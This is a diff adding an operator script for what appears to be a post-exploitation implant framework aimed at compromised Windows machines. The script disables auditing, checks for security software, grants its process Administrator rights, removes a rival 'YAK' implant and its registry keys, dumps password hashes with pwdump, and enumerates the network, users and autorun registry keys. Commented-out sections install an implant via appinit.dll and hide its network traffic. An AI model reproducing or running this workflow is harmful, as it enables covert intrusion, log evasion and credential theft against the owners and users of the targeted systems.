@@ -1,0 +1,529 @@
+#####################################################
+#20041029 - reworked for EP3 from old scripts, new changlog started
+#####################################################
+
+# Environment Variable to indicate whether Simple has finished
+`lpsetenv -option SIMPLE -value FALSE`;
+
+#####################################################
+#  Learn From the Past: Don't repeat old errors
+#####################################################
+
+#ifnot (prompt `script LearnFromThePast.eps`){
+#	echo "";
+#	echo "moving on then....";
+#	echo "";
+#}
+
+@echo off;
+@record on;
+string $ScriptsDir;
+if(`getdirectory -scripts`) {
+  string $Dir = GetCmdData("dir");
+	$ScriptsDir = $Dir[0];
+}else{
+	$ScriptsDir="E:\\resources\\ep\\scripts";
+}
+@record off;
+`lpsetenv -option YAK -value OFF`;
+@echo on;
+
+#####################################################
+#             Audit Section
+#####################################################
+
+bool $auditOff = false;
+
+if(`script disableauditing.eps`){
+	$auditOff = true;
+}else{
+	$auditOff = false;
+}
+pause;
+
+#####################################################
+#     Check Process List for Cisco Security Agent
+#####################################################
+
+`log processlist`;
+pause;
+
+#####################################################
+#             Elevation Section
+#####################################################
+
+@record on;
+bool $sys = false;
+bool $pCheck = false;
+if (`whoami`){
+	string $sUser;
+	$sUser= GetCmdData("user");
+      `lpsetenv -option privleges -value "$sUser"`;
+	if ($sUser == "system") {
+		$sys = true;
+	}
+}
+@record off;
+
+ifnot ($sys == true) {
+   # Get our current privileges
+
+   echo "Checking our current privileges...";
+   @record on;
+   bool $elevate_me = true;
+   string $sSys;
+   string $sAdmin;
+
+   echo "Get the targets name for administrator and system";
+
+    if (`wellknownid -name administrators`){
+        $sAdmin = GetCmdData("sid");
+    }
+
+    if (`wellknownid -name system`){
+	$sSys = GetCmdData("sid");
+    }
+
+  echo "Let's see if we have enough rights to move on";
+	$pCheck = true;
+    if (`processcheck -user $sSys`) {
+       $elevate_me = false;
+       echo "";
+       echo "You are system! Moving on...";
+       echo "";
+    }
+    else if (`processcheck -group $sAdmin`) {
+       $elevate_me = false;
+       echo "";
+       echo "You have Administrator rights! Moving on...";
+       echo "";
+    }
+    @record off;
+
+   ifnot ($elevate_me == false) {
+	echo "";
+	echo "Rut Roh! we're not the Admin or System...";	
+	echo "";
+	ifnot (prompt "Grant local Administrator rights to current process?") {
+	   echo "I'm guessing you have a reason for not elevating";
+	   return false;	
+ 	}
+	@record on;
+	bool $nt4a = true;
+
+	if (`systemversion`) {								
+ 	   int $major = GetCmdData("sysVerMajor");
+  		  if ($major != 4) {
+			$nt4a = false;
+	    }
+	}
+	if ($nt4a == true){
+	  if (prompt "Is this an NT4 terminal server?") {
+	   echo "Unable to elevate privileges on NT4 Terminal Server";
+           pause;
+	   
+	   }
+	}
+	@record off;
+
+
+    	ifnot (`get_admin`) {
+		echo "Failed to grant Administrator rights to your privilege";
+     		pause;
+     		echo "";
+     		echo "Administrator rights have been granted to your process";
+     		echo "Close the \"get_admin\" channel when you no longer wish to have these rights";
+     		echo "";
+     		pause;
+     	
+    	}
+     }
+}
+else {
+	echo "";
+	echo "Ok, system...Moving on...";
+	echo "";
+	pause;
+}
+
+#####################################################
+#	     Registry Check for Win2k SP4
+#####################################################
+@record on;
+`regquery -hive L -subkey "software\\microsoft\\windows nt\\currentversion"`;
+string $regValues;
+$regValues=GetCmdData("value_data");
+	
+`local run -command "perl $ScriptsDir/../../../tools/installdate.pl $regValues[1]" -redirect installdate`;
+@record off;
+`background script hotfixes.eps`;
+
+@record on;
+bool $nt4 = true;
+bool $xp = false;
+bool $dc = false;											
+bool $sp = false;
+
+if (`systemversion`) {
+   
+   int $major = GetCmdData("sysVerMajor"); 
+   int $spmajor = GetCmdData("sysSPMajor");
+   int $minor = GetCmdData("sysVerMinor");
+   int $product = GetCmdData("sysProduct");
+   
+    if ($major != 4) {
+		$nt4 = false;
+    }
+
+
+    #Added to Test for SP 4 on Win2k
+	if ($nt4 == false){
+		if ($spmajor == 4) {
+			$sp = true;
+			`lpsetenv -option ServicePack -value "SP4"`;
+   		}
+   	}
+	if ($product == 2){
+		$dc = true;
+	}
+}
+
+
+@record off;
+
+
+
+#####################################################
+#             Monitors Section
+#####################################################
+
+`script startmonitors.eps`;
+if (prompt "Run process info? *You should run normally run it*") {
+	`background script processdeep.eps`;
+}
+### moved to top of simple to check for Cisco Security Agent 
+#`log processlist`;
+#pause;
+
+#####################################################
+#             Nethide Section
+#####################################################
+
+@record on;
+`getnetaddr`;
+int $local_port = GetCmdData("remote_port");
+string $remote_address = GetCmdData("remote_address");
+@record off;
+`lpsetenv -option localIP -value $remote_address`;
+`lpsetenv -option localPORT -value $local_port`;
+
+#`script nethide3.eps $local_port`;
+
+echo "automated nethide has been temporarily disabled";
+
+#####################################################
+#             IDS Detection Section
+#####################################################
+
+#if (prompt "Run the ids logger?"){
+#	`script idslogger.eps`;
+#}
+
+#####################################################
+#             Checking For YAK
+#####################################################
+bool $success;
+@echo off;
+echo "#####################################################";
+echo "#             Checking For YAK";
+echo "#####################################################";
+if (`yak verify`){
+	`lpsetenv -option YAK -value ON`;
+	echo "                  YAK FOUND ON TARGET!!";
+	echo "MUST UNINSTALL UNLESS OTHERWISE INSTRUCTED BY HIGHER POWER! "; 
+	if(prompt "Uninstall YAK?"){
+		`yak collect`;
+		ifnot(`yak uninstall`){
+			echo "Uninstall Unsuccessful! WHY?";
+			echo "GO GET HELP!";
+		}else{
+			ifnot(`yak verify`){
+				echo "YAK Uninstalled! You May move on.";
+				`lpsetenv -option YAK -value OFF`;
+			}else{
+				echo "YAK NOT Uninstalled IEEEEEEE!";
+				echo "GO GET HELP!";
+			}
+		}
+	}
+}
+#check for the registry key of interest.
+
+echo "\nChecking for YAK registry keys";
+
+@echo on;
+if (`regquery -hive L -subkey "system\\currentcontrolset\\enum\\root\\legacy_kbpnp"`) {
+	#registry key is still there
+	echo "Found YAK's registry key: HKLM\\system\\currentcontrolset\\enum\\root\\legacy_kbpnp";
+	if (prompt "YAK's registry key still there, would you like to remove it?") {
+		
+		`regdelkey -hive L -key "system\\currentcontrolset\\enum\\root\\legacy_kbpnp" -recursive`;
+		#check one more time
+		if (`regquery -hive L -subkey "system\\currentcontrolset\\enum\\root\\legacy_kbpnp"`) {
+			echo "UNABLE TO REMOVE THE REGISTRY KEY.  FIND HELP";
+		}
+	}
+
+} else { echo "\n** No YAK registry key in CurrentControlSet. **\n";}
+
+#find how many controlSet's there are
+int $controlNums = 0;
+
+echo "\nChecking all other control Sets\n";
+
+bool $keepGoing = true;
+while ($keepGoing) {
+	$controlNums++;
+	@echo off;
+	if (`regquery -hive L -subkey "system\\controlset00$controlNums"`) {
+		@echo on;
+		if (`regquery -hive L -subkey "system\\controlset00$controlNums\\enum\\root\\legacy_kbpnp"`) {
+			if (prompt "Delete out of controlset00$controlNums ?") {
+				`regdelkey -hive L -key "system\\controlset00$controlNums\\enum\\root\\legacy_kbpnp" -recursive`;
+				#check one more time
+				if (`regquery -hive L -subkey "system\\controlset00$controlNums\\enum\\root\\legacy_kbpnp"`) {
+					echo "UNABLE TO REMOVE THE REGISTRY KEY.  FIND HELP";
+				}
+			}
+
+		} else { echo "\n** No YAK registry key in controlset00$controlNums. **\n\n";}
+
+	} else { $keepGoing = false; }
+		
+} 
+
+echo "\n*** YAK Registry Cleanup complete***\n";
+
+
+pause;
+@echo on;
+#####################################################
+#             Machine/network Info Section
+#####################################################
+
+if ($sys== true) {
+	echo "getting the well known Id's now..";
+	`wellknownid -name administrators -local`;
+	`wellknownid -name system -local`;
+}
+
+`script syspath.eps`;
+`background script drivercheck.eps`;
+`language`;
+`remotelocaltime`;
+`background netmap`;
+`netbios -local`;
+ifnot (`route2k -print`) {
+	`route`;
+}
+`arp -print`;
+#echo "not running arp at the moment";
+#if ( prompt "Run script arp.eps" ){
+#		 `script arp.eps`;
+#	}
+#	else { echo "No arp for you!"; }
+ifnot (prompt `background pwdump`) {
+	pause;
+}
+
+if ($nt4 == false){
+
+	`ipconfig`;
+	echo "not running portmap or fport right now";
+#	if ( prompt "Run portmap -maxports 750 -handlememory 2048000?" ){
+#		ifnot (`portmap -maxports 750 -handlememory 2048000`) {
+#			echo "Portmap failed!";
+#			if (prompt "Do you want to run FPORT?") {
+#				`script fport.eps`;
+#			}
+#		}
+#	}	
+	if ($xp == false){
+		if ($dc == true)
+		{
+			#if (prompt "Run ADGC, ADMODE, ADUSER? ** Generally say no to this, unless you have really good reason to!" ){
+			#	echo "OK, I assume you know what you are doing...";
+			#	`background adgc -all`;
+			#	`admode`;
+			#	`background aduser -all`;
+			#}
+echo "the automated adgc check has been temp disabled .. if needed run manually";
+		}
+	}
+				
+} else {
+		####################
+		# Commands for NT 4#
+		####################
+	if (prompt "do you want to run ipconfig on the target?") {
+		`run -command "ipconfig.exe /all" -redirect ipconfig`;
+	}
+echo "not running portmap or fport right now";
+#	if ( prompt "Run portmap -maxports 750 -handlememory 2048000?" ){
+#		ifnot (`portmap -maxports 750 -handlememory 2048000`) {
+#			echo "Portmap failed!";
+#			if (prompt "Do you want to run FPORT?") {
+#			`script fport.eps`;
+#			}
+#		}
+#	}
+}
+
+pause;
+
+ifnot (`script scheduler.eps`) {
+	pause;
+}
+`memory`;
+################################################################
+# drive info
+################################################################
+
+bool $ok;
+int $i = 0;
+@record on;
+string $cmd = "listdrives";
+$ok = `$cmd`;
+@record off;
+if ( $ok ) {
+	string $drive_letters = GetCmdData("drive");
+	bool $is_unknown = GetCmdData("is_drive_unknown");
+	bool $is_noroot = GetCmdData("is_drive_noroot");
+	bool $is_removable = GetCmdData("is_drive_removable");
+	bool $is_fixed = GetCmdData("is_drive_fixed");
+	bool $is_remote = GetCmdData("is_drive_remote");
+	bool $is_cdrom = GetCmdData("is_drive_cdrom");
+	bool $is_ramdisk = GetCmdData("is_drive_ramdisk");
+	$i = 0;
+	while ($i < sizeof($drive_letters)) {
+		string $current_drive = $drive_letters[$i];
+		if ( $is_unknown[$i] == true ) {
+#			echo "Unknown drive: $current_drive  ";
+		}
+		if ( $is_fixed[$i] == true ) {
+			`diskspace $current_drive `;
+		}
+		$i++;
+	}
+} else {
+	echo "unable to enumerate drives";
+}
+echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~";
+echo "If this is a new box, check the system drive free space";
+echo "to be sure you have enough free space to install a L4.";
+echo "Also take note of the memory usage.";
+echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~";
+pause;
+
+#####################################################
+#             User Info Section
+#####################################################
+
+if ($auditOff){
+	if (prompt "Do you want the target services,users,and groups? *** Only run if auditing disabled *** "){
+	 `background services -local`;
+	 `background users -local`;
+	 `background groups -local`;
+	 `background groups -global`;
+	}
+}else{
+	echo "Auditing was not disabled.  Not getting the target services, users, and groups.";
+	echo "These commands would likely get logged as Object Accesses in the Security Log.";
+}
+#####################################################
+#             Registry Section
+#####################################################
+
+# TODO: log currentversion\\windows, background the rest
+#  (make parse.ep.pl parse them out of the regquery files)
+
+`regquery -hive L -subkey "SYSTEM\\currentcontrolset\\control\\session manager\\power" -value Heuristics`;
+`regquery -hive L -subkey "software\\microsoft\\windows nt\\currentversion\\winlogon"`;
+`regquery -hive L -subkey "software\\microsoft\\windows nt\\currentversion\\windows"`;
+`regquery -hive L -subkey "software\\microsoft\\windows\\currentversion\\run"`;
+`regquery -hive L -subkey "software\\microsoft\\windows\\currentversion\\runonce"`;
+`regquery -hive L -subkey "software\\microsoft\\windows\\currentversion\\runonceex"`;
+`regquery -hive L -subkey "hardware\\description\\system\\centralprocessor" -recursive`;
+
+#####################################################
+#             Level 4 Section
+#####################################################
+
+#if (prompt "Do we need to install a level 4 or upgrade an existing implant?") {
+#	if (prompt "Do you want to do a Level 4 install?") {
+###		`level4install -local psxssdll.dl_ -remote appinit.dll -match systray.exe`;
+###		`free level4`;
+#		ifnot(`install`) {
+#			echo "Error in installation!!!";
+#			pause;
+#		} else { `script nethide3.eps 1154`; }
+#
+#	}
+#	else {
+#		ifnot(`upgrade`) {
+#			echo "Error in upgrade!!!";
+#			pause;
+#		} else { `script nethide3.eps 1154`; }
+#	}
+#}
+
+#####################################################
+#             Clean up plugins
+#####################################################
+
+#if (prompt "Do you want to free up the commonly unused plugins?"){
+	if ($nt4 == false){
+		if ($dc == true){
+			`free adgc`;
+			`free admode`;
+			`free aduser`;
+			} 
+	  `free ipconfig`;
+	} 
+	`free pwdump`;
+	`free wellknownid`;
+	if ($pCheck){
+		`free processcheck`;
+	}	
+	`free language`;
+	`free systemversion`;
+	`free remotelocaltime`;
+	`free scheduler`;
+	`free regquery`;
+	`free memory`;
+	`free services`;
+	`free users`;
+	`free groups`;
+	`free listdrives`;
+	`free diskspace`;	
+#}
+
+#####################################################
+#             Document Section
+#####################################################
+
+#if (prompt"Do you want to run docsurvey.eps?"){
+#	`script docsurvey.eps`;
+#}
+
+# Environment Variable to indicate whether Simple has finished
+`lpsetenv -option SIMPLE -value TRUE`;
+
+`plugins`;
+`channels`;
+
+#####################################################
+#             End Script
+#####################################################
+
+return true;
